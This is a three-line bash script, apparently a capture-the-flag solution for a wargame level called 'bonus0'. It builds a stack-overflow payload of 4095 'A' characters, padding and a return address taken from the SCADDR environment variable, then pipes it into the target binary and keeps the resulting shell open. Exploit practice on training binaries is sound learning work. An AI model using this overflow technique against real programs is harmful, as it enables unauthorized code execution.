#!/usr/bin/env bash

python -c 'import os; print 4095*"A" + "\n" + "BCDEFGHIJ" + os.getenv("SCADDR") + "OPQRSTUVWXY"' > exploit
cat exploit - | ./bonus0
